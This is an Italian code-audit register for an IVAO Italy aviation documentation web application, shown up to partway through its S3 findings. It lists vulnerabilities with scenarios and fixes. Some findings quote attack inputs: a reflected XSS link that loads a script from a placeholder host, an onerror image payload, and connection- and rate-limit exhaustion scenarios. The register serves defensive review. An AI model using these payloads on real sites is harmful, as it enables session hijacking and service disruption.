# Revisione totale del codice, secondo giro — 13 settembre 2026

**Commit:** `7fc44840` (1.25.2, in produzione) · **Stato:** registro chiuso, nessun fix applicato ·
**87 findings** `T-001`…`T-087` · **1 S1** · 15 S2 · 43 S3 · 28 S4

Seconda revisione integrale, ripartita da capo sei giorni dopo quella del 6-7 settembre
(`audit-2026-09-06-revisione-totale.md`, R-001…R-033). Tredici dimensioni lette in parallelo: autorizzazioni,
input, infrastruttura, motore documenti (due metà), dominio aeronautico, servizi in background, pagine,
componenti e JS, concorrenza, dati, qualità e test, documenti. A queste si aggiungono la base misurata e una
prova di sicurezza dal vivo, in locale e passiva in produzione. Questo documento è il **registro deduplicato**.
Quando due dimensioni hanno visto lo stesso difetto, qui compare una volta sola e le cita tutte e due.

> Nota di percorso: il repository vero sta in `…\vIPI Ivao Italy\vIPI Ivao Italy\`, una cartella sotto quella
> indicata negli ordini di lavoro. Questo file è stato scritto lì, accanto al registro del 6 settembre.

---

## 1. La risposta che conta

**Sì, c'è un S1, ed è sfruttabile oggi da chiunque.** È **T-001**, un XSS riflesso su pagine pubbliche servite
in SSR statico. Un link del tipo `/services/vsop/lirr/apps/vipi?app=<SCRIPT SRC=//HOST/X.JS></SCRIPT>`,
mandato a un editor o a un admin collegato, esegue JavaScript sull'origine della vIPI con la sua sessione.
La CSP è solo `Report-Only` e non ferma niente. La correzione è piccola: encodare gli argomenti dei
`string.Format` messi sotto `MarkupString`. **Va fatta per prima, in una PATCH a sé, senza migrazione.**

Subito dopo, nello stesso lotto di sicurezza, vanno tre S2:

- **T-002.** Chi perde l'incarico nello staff IVAO resta Admin o Editor finché visita il sito almeno una
  volta a settimana. Il cookie scorrevole non viene mai riconvalidato, e il login ricorrente riattiva
  perfino la riga del roster.
- **T-003.** XSS memorizzato: un Editor scrive un titolo di gruppo APP che esegue codice nella vista live di
  un Admin.
- **T-004.** Nei vIPI APP/ACC e nel vSOP militare le sezioni strutturate si salvano senza controllare il
  lock, e chi l'ha perso sovrascrive in silenzio il lavoro di chi lo tiene.

Fra gli S2 non di sicurezza, i più urgenti sono i **dati importati che si perdono o si falsano senza nessuna
segnalazione**. Sono T-005 (potatura delle aree regolamentate su un elenco parziale), T-006 (un errore HTTP
di IVAO timbrato come riuscito, che fa avanzare la soglia di eliminazione) e T-007 (frequenza azzerata su un
429). Seguono due difetti visibili sul **quadro vAWOS appena uscito**: le LVP non si chiudono più (T-009) e
le condizioni di tendenza vengono lette come osservate (T-010).

Nessun R-xxx chiuso è tornato nella forma originale. Tre findings sono però **gemelli mai coperti** di
difetti chiusi, e lo dicono esplicitamente: T-047 (R-018 sulle TWR), T-048 (R-019 sulle altre forme di
coordinata) e T-060 (la classe di R-023).

### Bilancio

| Gravità | Totale | CONFERMATO | di cui dal vivo | PLAUSIBILE |
|---|---|---|---|---|
| **S1** | 1 | 1 | – | 0 |
| **S2** | 15 | 15 | 1 (T-011) | 0 |
| **S3** | 43 | 33 | 1 (T-024) | 10 |
| **S4** | 28 | 22 | 2 (T-084, T-085) | 6 |
| **Totale** | **87** | **71** | 4 | **16** |

I 16 PLAUSIBILI sono: T-017, T-020, T-032, T-033, T-034, T-038, T-039, T-040, T-044, T-046, T-050, T-055,
T-060, T-063, T-074, T-075.

Tutti gli S1 e gli S2 sono stati **riaperti e ricontrollati sul codice** prima di scrivere questo registro,
con file, riga e scenario. Nessuno è stato declassato. Due precisazioni emerse nel controllo:

- **T-012.** Il commento di `DeletionService` alla riga 86 dice «lo fa un amministratore», ma il codice
  chiede Editor. La contraddizione sta già nel servizio, e la correzione deve prima scegliere quale delle
  due è la regola.
- **T-015 e T-016** sono dedotti dal codice e dal sorgente di `blazor.web.js` 10.0.9, non visti a schermo.
  Il meccanismo è certo; una prova con la skill `verifica-live` li chiude del tutto.

---

## 2. Base misurata e prove dal vivo

### Build, test, pacchetti, migrazioni (`7fc44840`)

| Controllo | Esito |
|---|---|
| Build Release `--no-incremental` | **0 avvisi, 0 errori**, 58,9 s. Host, E2E, Assets.Tests e AuroraBridge solo net8; il resto net8+net10 |
| Test Release | **11.788 verdi**, 0 falliti, 0 saltati. Tutti i 9 progetti hanno prodotto risultati per ogni TFM |
| Differenza net8/net10 in Infrastructure (+14) | Attesa: `MySqlMigrationsTests` è `#if NET8_0` |
| Pacchetti vulnerabili (anche transitivi) | **Nessuno** nei 26 progetti |
| Deprecati | xunit 2.9.3 (**R-004, ancora aperto**, non ripresentato); `System.Collections.Immutable` 6.0.0, transitivo e solo per il design time di EF 8 |
| Major indietro | Tutta la parte net8 su 8.0.30; Pomelo 8.0.3 → 9.0.0 (è Pomelo che ancora la produzione a EF 8); bunit 1.x → 2.x; Avalonia 11 → 12 (solo il bridge) |
| `has-pending-model-changes` SQLite net10 / net8, MySQL net8 | **Nessuna modifica pendente** in tutti e tre i casi |
| Test di allineamento modello/snapshot | Esiste per MySQL, **non esiste per SQLite** (T-087) |

Albero pulito alla fine: `git status` vuoto.

### Prova di sicurezza dal vivo

**In locale** abbiamo usato Release net8 su due copie del `vipi.db`, con un'istanza Production anonima e
una Development con identità di sviluppo (prima LIBB-CH Editor, poi XX-ZZ9 senza livello).

Le cose **a posto**:

- **Le 55 rotte `@page` da anonimo:** tutte le pagine riservate mostrano «Accesso riservato» senza dati.
- **Anteprime `?as=draft` e `?as=release:N` da anonimo:** HTML identico alla vista pubblica.
- **Utenti senza il livello richiesto:** l'Editor è rifiutato sulle pagine admin, l'utente senza livello su
  editor, versioni e allegati.
- **Intestazioni:** nosniff, X-Frame-Options DENY, Referrer-Policy e Permissions-Policy presenti.
- **File sensibili e traversal:** tutti 404 (`appsettings*`, `vipi.db`, pdb, dll, `.git`, `diagnostica`,
  `vipi-keys`), anche con `..`, `%2e%2e` e `..%5c`.
- **Metodi HTTP:** POST senza antiforgery dà 400; PUT, DELETE e TRACE danno 405.
- **Richieste enormi:** 30 kB di query o di percorso danno 414.
- **Lingua:** `?culture=` con valori sporchi o con CRLF ricade su «it».
- **vAWOS:** il tetto per IP funziona (429), e un `?test=` da anonimo viene ignorato.

Quattro **difetti riprodotti**: T-011, T-024, T-084, T-085.

**In produzione** abbiamo fatto circa 37 GET anonime, senza POST e senza login:

- **Cache:** `cf-cache-status: DYNAMIC` ovunque, quindi la Cache Rule non è attiva. Le pagine admin
  rispondono `no-store`.
- **File sensibili:** 404 da Kestrel oppure 403 da Plesk.
- **Salute:** `/vsop/health` dice *Degraded*, `/ready` dice *Healthy*.
- **Login:** fa 302 verso l'SSO con PKCE e nonce; i cookie di correlazione sono `secure`.
- **Versione:** nessun banner esposto.
- **Non riprovati apposta in produzione:** il 500 di T-024 (avrebbe sporcato il registro errori vero) e la
  lingua di T-011 (avrebbe cambiato la lingua servita agli utenti).

---

## 3. Registro

Legenda dei campi: **G** gravità · **V** verdetto (C = confermato sul codice, C-vivo = riprodotto,
P = plausibile) · **Mig.** serve una migrazione. Quando nella riga «Dimensioni» compaiono due nomi, il
finding è la fusione di due segnalazioni.

### S1

#### T-001 — XSS riflesso su pagine pubbliche: la query finisce in un `MarkupString` senza encoding

| | |
|---|---|
| **G / V / Mig.** | S1 · C · no |
| **Dimensioni** | sec-input |
| **Dove** | `src/Vipi.Ui/Pages/AppnPage.razor:22` · `src/Vipi.Ui/Pages/VloaListPage.razor:31` · `src/Vipi.Ui/Components/VloaEditor.razor:20` |
| **Scenario** | Link `/services/vsop/lirr/apps/vipi?app=<SCRIPT SRC=//HOST/X.JS></SCRIPT>`. Il callsign non si risolve, quindi si rende il ramo `_doc is null` e `string.Format(Sito["Appn_AppNotFoundBody"], _app, …)` mette il valore dentro `<code>{0}</code>` e dentro `href="{1}"`, poi lo casta a `MarkupString`. La pagina non ha `@rendermode`: è SSR statico, lo `<script>` arriva crudo nell'HTML e il browser lo esegue con la sessione di chi clicca. `ToUpperInvariant()` non protegge, perché i tag HTML non distinguono maiuscole e minuscole. Stesso schema con `?acc=` su VloaListPage. Su VloaEditor il render è interattivo, quindi lo `<script>` non parte ma un `<IMG SRC=X ONERROR=…>` sì |
| **Prova** | AppnPage:182 `_app = (App ?? "").Trim().ToUpperInvariant()`; resx:243 `&lt;code&gt;{0}&lt;/code&gt; … &lt;a href="{1}"&gt;`; VloaListPage:146 e :31; VloaEditor:20 con `Foreign` preso dalla query (VloaEditorPage:64). La CSP è solo `Content-Security-Policy-Report-Only` (VipiStartup.cs:337). Il censimento scritto in VipiStartup.cs:304-305 («solo MarkdownLite e AorBlock.BuildSvg costruiscono HTML») non conosceva questi casi |
| **Correzione** | `WebUtility.HtmlEncode` sugli argomenti (e `Uri.EscapeDataString` dentro l'href). Meglio un helper unico per i `Format` sotto `MarkupString`, da applicare anche a LivePage:143 e :242 (T-003) e a ConfinantiAdminPage:312. In più una guardia di test che rifiuti `(MarkupString)string.Format(` con argomenti non encodati |

### S2

#### T-002 — Le posizioni staff restano nel cookie per sempre: chi perde l'incarico resta Admin/Editor

| | |
|---|---|
| **G / V / Mig.** | S2 · C · no |
| **Dimensioni** | sec-auth + sec-infra |
| **Dove** | `src/Vipi.Host/Auth/VipiStandaloneAuthExtensions.cs:64` (anche `EfStaffRosterRepository.cs:34`, `RoleAdminService.cs:121`) |
| **Scenario** | Un IT-DIR viene tolto dallo staff IVAO. Il cookie `vipi.auth` ha `ExpireTimeSpan` di 7 giorni con `SlidingExpiration`: con una visita ogni pochi giorni si rinnova all'infinito, e il claim `userStaffPositions=["IT-DIR"]` non viene mai riletto. Il livello è `max(claim, override)`, quindi nessun admin può declassarlo dal prodotto (`SetAsync` rifiuta i livelli sotto il «pavimento»). Se la verifica del roster lo disattiva, entro 5 minuti `StaffLoginTrackingMiddleware` chiama `UpsertLoginAsync` con le posizioni vecchie e rimette `IsActive = true` (e la verifica stessa di norma non gira: T-033) |
| **Prova** | Nessun `OnValidatePrincipal` / `RejectPrincipal` in `src` (grep). `EfStaffRosterRepository.cs:34` `sm.IsActive = true; // un nuovo login riattiva` |
| **Correzione** | `CookieAuthenticationEvents.OnValidatePrincipal` che ogni N ore rilegge `/v2/users/{vid}` con il token app (`IUserDirectory` esiste già) e sostituisce il claim o rigetta il principal. In subordine: durata breve e non scorrevole. `RecordLoginAsync` non deve riattivare una riga disattivata partendo da claim vecchi |

#### T-003 — XSS memorizzato nella vista live: il titolo del gruppo APP finisce in un `MarkupString`

| | |
|---|---|
| **G / V / Mig.** | S2 · C · no |
| **Dimensioni** | sec-input |
| **Dove** | `src/Vipi.Ui/Pages/LivePage.razor:242` |
| **Scenario** | Un Editor rinomina un gruppo APP del documento ACC in `<img src=x onerror=…>` e pubblica (anche la pubblicazione richiede solo Editor). Quando un membro del gruppo è online (`Delegated = true`, solo dalla stazione d'area CTR), la vista live rende `string.Format(L["Live_CollapsedBody"], g.Block.Title)` sotto `MarkupString` in un'isola InteractiveServer, e l'`onerror` si esegue nel browser di chiunque guardi, admin compresi. È un'escalation Editor → Admin. Alla riga 236 lo stesso titolo è invece encodato |
| **Prova** | resx:291 `&lt;b&gt;{0}&lt;/b&gt;`; `AccDocumentAssembler.cs:77` `Title = blockSection.Title`, senza pulizia; `AreaLiveStation.cs:47-49` |
| **Correzione** | Encodare l'argomento, oppure scrivere `<b>@g.Block.Title</b>` in Razor. Insieme a T-001 |

#### T-004 — Le sezioni strutturate di APP, ACC e vSOP militare si salvano senza controllare il lock

| | |
|---|---|
| **G / V / Mig.** | S2 · C · no |
| **Dimensioni** | sec-auth + content-a |
| **Dove** | `src/Vipi.Application/Content/AppDocumentService.cs:365` (anche 342, 380, 400, 468, 494-505) · `src/Vipi.Application/Content/AccDocumentService.cs:223` (e `AddGroupAsync`, `RemoveGroupAsync`, `MoveGroupAsync`) · `src/Vipi.Infrastructure/Persistence/EfMilitaryDocumentService.cs:211-378` |
| **Scenario** | L'Editor A apre l'editor APP e prende il lock (TTL 30 min, lo shell non ha battito). Si allontana. Il lock scade, oppure B usa «sblocca comunque», che dal 28 agosto è permesso a ogni Editor. B prende il lock e riscrive le Separazioni. A torna, la sua pagina è ancora in modifica, cambia una riga: `SaveSeparationsAsync` controlla solo il ruolo e sovrascrive per intero il `BodyJson` di B, senza errore. Un salvataggio di prosa dello stesso A verrebbe invece rifiutato con `EditConflictException` |
| **Prova** | `EnsureAsync` (riga 166) = solo `EnsureAtLeast(Editor)`; `EfEditingRepository.SaveSectionBlockJsonAsync:572` e `…BySectionAsync:519` controllano solo `RequireDraftAsync`. `IsLockHeldByAsync` è usato soltanto da `EditingService.EnsureLockAsync:317` e da `AirportLockGuard`. È la regola che il progetto ha già scritto per gli aeroporti («un tasto spento non è una guardia», `AirportLockGuard.cs:63-67`) |
| **Correzione** | Portare nei tre servizi la porta dell'aeroporto: una guardia condivisa (`IsLockHeldBy` + rinnovo) prima di ogni `Save*`, `Add`/`Remove`/`Move` compresi, che sollevi `EditConflictException`. Lo shell sa già gestirla |

#### T-005 — Import aree regolamentate: una pagina fallita pota in blocco legami e aree dell'ACC

| | |
|---|---|
| **G / V / Mig.** | S2 · C · no |
| **Dimensioni** | content-b |
| **Dove** | `src/Vipi.Application/Content/SpecialAreaImportUseCase.cs:91` · `src/Vipi.Infrastructure/Ivao/IvaoAccClient.cs:179` e `:193` |
| **Scenario** | LIRR ha le aree su 3 pagine. Nel giro notturno la pagina 2 risponde 429/503: `GetStringAsync` torna null e il client fa `break; // usa quanto raccolto`. `PruneSpecialAreasNotInAsync` riceve solo le aree di pagina 1: toglie i legami delle pagine 2-3 e **cancella** le aree rimaste orfane, shape comprese. Lo stesso succede per tutte le aree se la pagina 1 risponde 200 con un corpo senza `items`/`data` o con un array vuoto (`if (!any) break`). Per 24 ore le sezioni le perdono, una release pubblicata nel frattempo le congela assenti, e parte un impatto AreaGone per ogni documento. È la famiglia delle «83 aree azzerate» del 26 agosto, arrivata da un'altra strada |
| **Correzione** | Nel client, una pagina successiva fallita deve sollevare e non troncare. Nel use case, niente potatura con elenco vuoto o oltre una quota (`SogliaTimbro.TroppiPerEssereVeri`), oppure `SogliaEliminazione` a due giri sul timbro del legame |

#### T-006 — Gli import timbrano RIUSCITO un errore HTTP di IVAO: niente retry, e la soglia di eliminazione avanza

| | |
|---|---|
| **G / V / Mig.** | S2 · C · no |
| **Dimensioni** | services |
| **Dove** | `src/Vipi.Infrastructure/Ivao/AccImportHostedService.cs:48` · gemelli in `AirportDirectoryImportHostedService.cs:79`, `AirportDataImportHostedService.cs:63`, `SpecialAreaImportHostedService.cs:48` |
| **Scenario** | Alle 03:00 `/v2/centers` risponde 503, oppure 403 perché il token ha perso lo scope. `IvaoAccClient.cs:50` solleva `InvalidOperationException`. Il wrapper la cattura come «credenziali assenti», logga a livello Information e restituisce `true`. `GatedImportLoop.cs:52-54` chiama allora `MarkSuccessAsync`: niente retry dopo 1 h, `LastError` azzerato, la pagina Sorgenti diventa verde e `PrevSuccessUtc` scorre. Dopo due notti (con un 403 persistente succede ogni notte) `SogliaEliminazione.Consentita` autorizza l'eliminazione di **ogni** ACC, settore o aeroporto mai riletto. L'eliminazione vera resta un gesto manuale, ma la pagina degli spariti li elenca tutti. Nella stessa rete finirebbe inghiottita anche una `InvalidOperationException` di EF (la famiglia di R-015) |
| **Correzione** | Catturare solo il caso «non configurato», verificato prima con `IsConfigured` o con un tipo dedicato, e in quel caso tornare `true` **senza** timbrare. Gli errori HTTP devono risalire, oppure i client sollevano `HttpRequestException` |

#### T-007 — Import ACC: un dettaglio subcenter fallito azzera la frequenza in catalogo e nei Sector

| | |
|---|---|
| **G / V / Mig.** | S2 · C · no |
| **Dimensioni** | services |
| **Dove** | `src/Vipi.Infrastructure/Ivao/IvaoAccClient.cs:138` → `src/Vipi.Infrastructure/Persistence/EfAccAdminRepository.cs:291` |
| **Scenario** | `/v2/subcenters/LIRR_NE_CTR` risponde 429 anche dopo i 3 tentativi. `freq` resta null e `row.Frequency = s.Frequency` la cancella. `EfSectorProjectionService.cs:138` la copia in `Sector.DefaultFrequency`, e vista live e bozze restano senza frequenza per almeno 24 h. Due righe sotto il poligono è protetto («l'assenza non è un ordine di cancellare»), e il gemello degli aeroporti (`AirportSectorImporter.cs:43-45`) ripiega sul valore precedente. *Precisazione:* un timeout non azzera niente, perché fa fallire l'intero giro; il difetto vale per i 4xx e i 5xx |
| **Correzione** | `if (s.Frequency is not null) row.Frequency = s.Frequency;`, oppure distinguere nel client «dettaglio non letto» da «dettaglio senza frequenza» |

#### T-008 — Annullare una release SUPERATA di un documento unito cancella quella IN VIGORE del gemello

| | |
|---|---|
| **G / V / Mig.** | S2 · C · no |
| **Dimensioni** | content-b |
| **Dove** | `src/Vipi.Application/Content/ReleaseService.cs:570` |
| **Scenario** | Unione vIPI LIBV + vSOP militare LIBV, due «Pubblica ora» nello stesso ciclo: A ha v1 superata e v2 in vigore, B lo stesso. L'editore annulla la v1 di A, che il pannello presenta come «cancella solo storia» (`Rel_CancelPromptOld`). Per A si usa `rel.Id`, cioè la v1, ma per B la «sorella» è quella con il `VersionNumber` più alto del ciclo: la **v2 in vigore**. `CancelAsync` la rimuove. B torna indietro, o sparisce dal pubblico se non ha altre release, mentre A resta alla v2: la pagina unita mostra due fotografie di momenti diversi |
| **Correzione** | Accoppiare le sorelle per pubblicazione (lotto, oppure lo stesso `CreatedUtc` della transazione) e non per ciclo. Come minimo: se la release annullata non è la vincitrice del suo ciclo, non toccare gli altri membri |

#### T-009 — vAWOS: con cielo senza strati coprenti le LVP non si chiudono mai

| | |
|---|---|
| **G / V / Mig.** | S2 · C · no |
| **Dimensioni** | content-b + quality |
| **Dove** | `src/Vipi.Application/Content/Lvp.cs:183` (`Sopra`), con `:175` e `src/Vipi.Ui/wwwroot/vipi-awos.js:144` |
| **Scenario** | LIRF in nebbia: `R16L/0400`, stato InVigore, il JS rimanda `inforce=true`. La nebbia si alza: `9999 NSC` o `CAVOK`. Senza BKN, OVC o VV, `CeilingFt` è null, e per `WeatherModels.cs:92-94` null vuol dire «nessuno strato coprente», non «non misurato». `Sopra(null, 300)` restituisce false, `Cancellabile` è falso e lo stato resta InVigore. Il JS rimette `lvpInVigore = true` e il ciclo si richiude a ogni giro: la pastiglia «LVP» resta accesa sotto un cielo sereno finché qualcuno non ricarica la pagina. Anche arrivati a `Cancellabile` (con BKN030) lo stato resta per sempre, perché il JS lo conta come in vigore e sul quadro non c'è niente per confermare la chiusura. In senso opposto, un solo giro NonValutabile azzera la memoria |
| **Prova** | Nessun caso con `giaInVigore: true` e `ceilingFt: null` in `LvpTests`, e nessun test a sequenza di giri |
| **Correzione** | Nel confronto di cancellazione trattare un soffitto null con visibilità presente come «sopra ogni soglia». Decidere l'uscita da Cancellabile e non azzerare la memoria su NonValutabile. Fare la correzione **una volta sola** dentro il valutatore (vedi T-077) e aggiungere un test a sequenza |

#### T-010 — Il parser METAR legge TEMPO/BECMG/RMK come condizioni presenti

| | |
|---|---|
| **G / V / Mig.** | S2 · C · no |
| **Dimensioni** | aero |
| **Dove** | `src/Vipi.Application/Weather/MetarParser.cs:49` (ciclo 49-81; `ChangeTokens` dichiarato alla riga 35 e mai usato) |
| **Scenario** | `LIMC 130250Z 00000KT 3000 BR FEW010 08/07 Q1022 TEMPO 0300 FG VV001`. Il ciclo non si ferma a TEMPO: VV001 porta `CeilingFt` a 100 e `LvpValutatore` risponde InVigore, anche se l'osservazione dice 3000 m senza strati coprenti. `BECMG BKN002` porta il soffitto a 200, cioè Preparazione. `TEMPO RA` imposta `HasRain`, quindi pista bagnata e regola Wet invece di Dry. Lo stesso METAR alimenta il quadro vAWOS, il riquadro LVP dei documenti e la pista in uso. Solo vento, visibilità e temperatura sono protetti da `is null`: nubi, VV, fenomeni e RVR no |
| **Correzione** | Fermare la lettura delle condizioni al primo token di tendenza (registrando NOSIG) o a RMK, e mettere il resto in `Trend`. Test con `TEMPO … VV001` e con `BECMG BKN002` |

#### T-011 — La cache delle letture anonime varia solo sul cookie: la lingua di `Accept-Language` passa al lettore successivo

| | |
|---|---|
| **G / V / Mig.** | S2 · C-vivo · no |
| **Dimensioni** | sec-infra (S2) + sicurezza-dal-vivo (S3, riprodotto) |
| **Dove** | `src/Vipi.Host/VipiStartup.cs:179` · `src/Vipi.Host/CacheDelleLettureAnonime.cs:87` (`Vary: Accept-Encoding, Cookie`) · `deploy/atc-ivao/LEGGIMI-DEPLOY.md:237` |
| **Scenario** | Riprodotto in locale in modalità Production. Una GET con `Accept-Language: en` su un URL nuovo produce `<html lang="en">`; subito dopo la stessa GET con `Accept-Language: it` riceve ancora la copia inglese, e viceversa. Senza cookie di lingua (il caso di ogni prima visita) la lingua viene da `Accept-Language`, ma la chiave di cache è `lingua=""`. Il circuito poi ridisegna le isole nell'altra lingua e la pagina resta mescolata. La Cache Rule prevista per Cloudflare porta lo stesso difetto al bordo. In produzione oggi si vede poco solo perché il processo riparte spesso (Q5). |
| **Perché S2** | Blocca i due passi già chiesti, `passenger_min_instances` e la Cache Rule: appena la cache regge, il difetto si accende per tutti |
| **Correzione** | Mettere nella chiave, in `Vary` e nella Cache Rule la lingua **risolta** (`IRequestCultureFeature`), oppure togliere `AcceptLanguageHeaderRequestCultureProvider` |

#### T-012 — Un Editor non può né vedere l'anteprima né eliminare un documento gestito

| | |
|---|---|
| **G / V / Mig.** | S2 · C · no |
| **Dimensioni** | content-a |
| **Dove** | `src/Vipi.Application/Content/DeletionService.cs:274` → `src/Vipi.Application/Content/EditorTaskService.cs:70` |
| **Scenario** | LIRR-CH (Editor) su `/services/vsop/versions` preme il cestino di una vIPI gestita. Il tasto è visibile a chi è Editor. `AnteprimaAsync` supera `EnsureAtLeast(Editor)` (righe 89 e 106), ma `PianoAsync` chiama `_incarichi.ListAllAsync()`, che fa `EnsureAdmin()` e solleva `EditNotAllowedException`. Il tasto acceso risponde «non permesso». Settori, aeroporti e ACC invece si eliminano. Il commento alla riga 86 («lo fa un amministratore») contraddice il codice che gli sta sotto. Il test usa un fake di `IEditorTaskService`, quindi non se ne accorge |
| **Correzione** | Il committente sceglie la regola. Se Editor, leggere gli incarichi da `IEditorTaskRepository`, come già fa `WorkListService:51`. Se Admin, dichiararlo nel servizio e spegnere il tasto in VersioniPage e PendingPage. In entrambi i casi un test con il servizio vero |

#### T-013 — ImportaTabella smaltisce il semaforo che la ricostruzione in volo rilascia: chiudere il pannello abbatte il circuito

| | |
|---|---|
| **G / V / Mig.** | S2 · C · no |
| **Dimensioni** | concurrency |
| **Dove** | `src/Vipi.Ui/Components/ImportaTabella.razor:474` (`Release` alla riga 459) |
| **Scenario** | Si incolla una tabella e parte `InFila`, che aspetta `CostruisciAsync` (risoluzione degli scali su MariaDB). Si preme «Annulla», che è attivo perché `Occupato` riflette il salvataggio e non la ricostruzione. `Dispose` fa `Cancel()` e poi `_unaAllaVolta.Dispose()`. La continuazione annullata arriva al `finally` **dopo** il Dispose sincrono, e `Release()` su un semaforo smaltito solleva `ObjectDisposedException` fuori dal gestore: circuito abbattuto, editor perso con tutto il non salvato. C'è anche una via quasi deterministica: la textarea usa `@onchange`, quindi il clic su Annulla prima toglie il fuoco e fa partire la ricostruzione, poi smonta il pannello. È esattamente il guasto del 4 settembre, già documentato in `DocumentEditorShell.cs:386-398` e `ScopeProprioCheAspetta.cs:41-50` («il semaforo non si smaltisce») |
| **Correzione** | Togliere `_unaAllaVolta.Dispose()`, oppure passare a `ScopeProprioCheAspetta` |

#### T-014 — Ricerca pubblica: ogni tasto lancia una ricerca sul DbContext del circuito, e due ricerche sovrapposte lo abbattono

| | |
|---|---|
| **G / V / Mig.** | S2 · C · no |
| **Dimensioni** | ui-pages |
| **Dove** | `src/Vipi.Ui/Pages/SearchPage.razor:77` (input alla riga 22) |
| **Scenario** | Un anonimo scrive «LIRF» di seguito su `/services/vsop/search`. Ogni `keyup` chiama `Search.SearchAsync` (5-8 query, con LIKE su tutti i blocchi) sullo stesso `VipiDbContext`, Scoped per circuito, senza sentinella, senza debounce e senza scope proprio. La seconda ricerca parte mentre la prima aspetta, EF solleva «A second operation was started», l'eccezione esce dal gestore e il circuito cade. Quando non cade, una risposta vecchia può sovrascrivere `_hits`. R-016 non elencava questa pagina, perché passa da un servizio e non da un repository iniettato |
| **Correzione** | Debounce con contatore di giro, una sola ricerca in volo, e scarto dei risultati superati. Meglio ancora scope proprio con `InFilaAsync` |

#### T-015 — Mappe Leaflet vuote dopo una navigazione enhanced che riusa il contenitore

| | |
|---|---|
| **G / V / Mig.** | S2 · C (codice + sorgente di `blazor.web.js` 10.0.9; da vedere a schermo) · no |
| **Dimensioni** | ui-components |
| **Dove** | `src/Vipi.Ui/wwwroot/vipi-aor.js:325` e `:519` (guardia alla riga 499) · `src/Vipi.Ui/wwwroot/vipi-mva.js:72` e `:82-84` · stessa classe in `vipi-aor3d.js:515-546` |
| **Scenario** | Su un documento con sezioni marcate si clicca «ATC» nella AudienceChip: un link alla stessa pagina con `?vista=`, cioè navigazione enhanced. Il DomSync conserva lo stesso `div.aor-leaflet`, cancella `data-init` perché il server non lo scrive, e rimette l'SVG di ripiego, ma `_leaflet_id` e `_leafletMap` restano sull'elemento. Al riaggancio `el.innerHTML = ''` e poi `L.map(el)` solleva «Map container is already initialized»: il riquadro resta **vuoto**, senza mappa e senza ripiego, e il `forEach` si interrompe lasciando anche le mappe successive col ripiego. Nessun `map.remove()` in tutto il file. Nel 3D invece si accumulano scene, listener e WebGLRenderer |
| **Correzione** | Tenere lo stato in una proprietà JS invece che in un attributo `data-`. Se `el._leafletMap` esiste, fare `remove()` prima di ricreare. Per il 3D, `renderer.dispose()` e rimozione dei listener. Stessa radice di T-016 e T-070 |

#### T-016 — vAWOS: dall'elenco a uno scalo i tasti si agganciano due volte e non fanno più niente

| | |
|---|---|
| **G / V / Mig.** | S2 · C (codice + sorgente di Blazor; da vedere a schermo) · no |
| **Dimensioni** | ui-components |
| **Dove** | `src/Vipi.Ui/wwwroot/vipi-awos.js:343` (con `:68` e `:77`) |
| **Scenario** | Da `/services/vawos` si clicca LIBC. `AwosPage.razor:36` disegna lo stesso `div.awos` per l'elenco e per lo scalo: il DomSync conserva il nodo e cancella `data-awos-legato`. `sincronizza` va avanti perché l'ICAO è cambiato e `collegaTasti` aggiunge un **secondo** ascoltatore. Ogni clic esegue il gestore due volte: DAY/NIGHT torna com'era, `apri()` apre e subito richiude (LOCAL REP., ATIS MSG, EXT. DATA, TEST METAR) e la freccia di pista salta un passo. È proprio il percorso che il commento alle righe 341-342 dice di aver coperto |
| **Correzione** | Segnare il nodo in un `WeakSet`/proprietà JS, oppure delegare un solo ascoltatore su `document` |

### S3

Formato compatto: **titolo** — dimensioni · V · `file:riga`, poi scenario, prova e correzione. Nessun S3
richiede una migrazione, salvo dove è scritto.

**T-017 — `/vsop/api/v1/atc/sessions?vid=` anonimo aggira «le sessioni di un altro le vede solo lo staff, con audit».**
Dimensioni: sec-auth (S3) + sec-infra (S2) · **P** · `src/Vipi.Hosting/VipiModuleExtensions.cs:433`.
- **Scenario.** Un anonimo chiama `?vid=727049&limit=500&offset=…` e ottiene callsign, frequenza, rating e
  orari di 12 mesi di turni, senza nessuna riga di audit.
- **Il conflitto.** La stessa ricerca dalla UI è negata (`StatsHome.razor:430`, `StatsSessionPage.razor:167`,
  `AtcWorldArchivePage`), e la carta statistiche §14 la riserva allo staff con audit. La carta dell'archivio
  §8 invece dichiara l'endpoint anonimo di proposito, giustificandolo col whazzup pubblico, che però il
  passato non ce l'ha. In più lo storico arriva da `/v2/tracker/sessions`, che vuole il token.
- **Perché PLAUSIBILE.** Sono due decisioni scritte che si contraddicono: decide il committente. Se prevale
  §14, il finding sale a S2.
- **Correzione.** Una regola sola: niente filtro `vid` agli anonimi, oppure endpoint dietro ruolo o chiave;
  in alternativa si allinea la carta §14.

**T-018 — Il livello resta fisso per tutta la vita del circuito: togliere una promozione a mano non ferma chi ha la pagina aperta.**
sec-auth · C · `src/Vipi.Application/Auth/EditAuthorizationService.cs:111`.
- **Codice.** `_role ??= _resolver.Effective(Corrente, _overrides.For(...))` memoizza anche la metà
  «override», che `RoleOverrideCache` cambia a caldo apposta (`RoleAdminService.cs:129`). Il servizio è
  Scoped, quindi vive quanto il circuito.
- **Correzione.** Memoizzare solo la parte che viene dai claim.

**T-019 — Un solo contatore «globale» per vAWOS, archivio e bridge, consumato anche quando poi scatta il tetto per IP.**
sec-infra · C · `src/Vipi.Hosting/VipiModuleExtensions.cs:365`.
- **Scenario.** Un client lancia circa 10 richieste al secondo su `/services/vawos/api/LIRF?x=<casuale>`.
  Il globale (600 al minuto) si consuma prima del rifiuto per IP, e da lì in poi tutti i quadri vAWOS e
  l'archivio (stessa `GlobalKey`, tetto 300) rispondono 429. Le chiavi per IP nude collidono fra archivio
  e bridge.
- **Correzione.** Chiavi globali per endpoint e prefissi su quelle per IP; controllare prima il tetto per
  IP, oppure restituire il gettone.

**T-020 — In produzione l'«IP del chiamante» è quello del proxy, quindi i controllori condividono un secchio.**
sec-infra · **P** · `src/Vipi.Host/VipiStartup.cs:286`.
- **Codice.** Si fida solo di loopback e nessuno legge `CF-Connecting-IP`. Più di 10 controllori collegati
  sul vAWOS dallo stesso PoP di Cloudflare prendono 429.
- **Da misurare.** Quale IP arriva davvero dietro nginx e Passenger: va scritto in diagnostica.
- **Correzione.** Usare `CF-Connecting-IP` quando la connessione arriva da loopback, oppure il VID per i
  collegati. Correggere i commenti di `AuroraBridgeOptions`.

**T-021 — Lo stream SSE pubblico ha solo un tetto globale di 300 connessioni.**
sec-infra · C · `src/Vipi.Hosting/VipiModuleExtensions.cs:292`.
- **Scenario.** Uno script apre 300 GET `/vsop/live/atc` e le tiene vive con il ping ogni 25 s: tutti i
  LiveBadge ricevono 503 finché resta collegato.
